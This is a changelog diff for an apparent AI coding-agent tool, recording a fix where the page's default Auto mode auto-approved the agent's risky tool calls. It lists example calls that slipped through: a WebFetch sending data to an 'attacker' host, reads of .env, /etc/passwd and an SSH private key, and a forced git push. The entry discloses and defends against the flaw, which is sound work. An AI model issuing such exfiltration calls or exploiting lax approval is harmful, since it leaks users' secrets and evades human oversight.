@@ -1,5 +1,31 @@
 # Changelog
 
+## 1.6.12 - the Claude engine's must-ask cards survive the page's Auto mode
+
+🔴 **In the default mode, the ADR-032 boundary of the Claude engine was off.** The runner emitted
+every approval card as `policy: "confirm"`. The page's Auto mode — the default,
+`localStorage.getItem('shvia.codeApproval') || 'auto'` — approves by itself any `confirm` card it
+judges "inside the project". Measured on 23/09 by running the page's own `gateWithinProject`
+against the runner's previews: `WebFetch https://attacker/?d=…`, `Read .env`, `Read /etc/passwd`,
+`Read /home/…/.ssh/id_ed25519` and `git push --force` were all **auto-approved**. The cards were
+emitted, so `politica.test.mjs` stayed green — it checked the verdict, not what happens to it.
+That is the F-13 exfiltration chain, reopened in the mode new users get.
+
+- `decidir()` now returns the card's `politica`. What ADR-032 asks "at any level" — network
+  egress (`WebFetch`/`WebSearch`), a protected path, a destructive command — goes out as
+  `always`, the one policy the page never auto-approves and never offers "Sempre" for. A read
+  outside the project, and the ordinary manual/edit cards, stay `confirm`.
+- The preview moved from `claude-runner.mjs` (which runs on import, so nothing in it is
+  testable) to `politica.mjs` as `previa()`, beside the verdict it must agree with. A read now
+  shows its path as a token of its own (`Read /etc/passwd`): inside JSON the path followed a
+  `"`, and the page's check — absolute path, `~` or `..` as a whitespace-separated token — read
+  it as inside the project.
+- Two tests; two reversals measured (`WebFetch` back to `confirm`, the read preview back to JSON),
+  each failing the right one. Runner suites: 43 = 43 passed.
+
+⚠️ Not changed here, and recorded in ADR-032: the page (SHVIA-WEB) still auto-approves any
+`confirm` card it misjudges as inside, and that includes the `anna` engine's cards.
+
 ## 1.6.11 - reloading or leaving the page ends that window's agent
 
 **An agent kept running after its page was gone.** The sidecar of a window was killed only when
